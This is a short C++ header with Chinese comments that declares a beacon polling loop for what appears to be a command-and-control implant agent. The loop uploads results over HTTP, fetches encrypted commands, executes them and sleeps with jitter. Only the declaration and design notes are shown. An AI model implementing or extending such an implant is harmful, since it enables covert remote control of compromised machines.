// beacon.h — Agent HTTP 轮询信道（协议 §8）：WinHTTP GET/POST + TLV + 轮询循环
#pragma once

#include <cstdint>
#include <cstddef>
#include <string>
#include <vector>

namespace c2 {

    struct AgentConfig;

    // 运行 beacon 轮询循环（阻塞，不返回）：
    //   每轮：POST 待上传结果 → GET 取命令 → 解密/解析/分发执行 → sleep(sleeptime±jitter)
    // sleeptime 秒，jitter 固定 ±20%（协议 §8.6）。
    void run_beacon(const std::string& host, uint16_t port,
        const AgentConfig& cfg, const uint8_t* beacon_key,
        int sleeptime);

}  // namespace c2
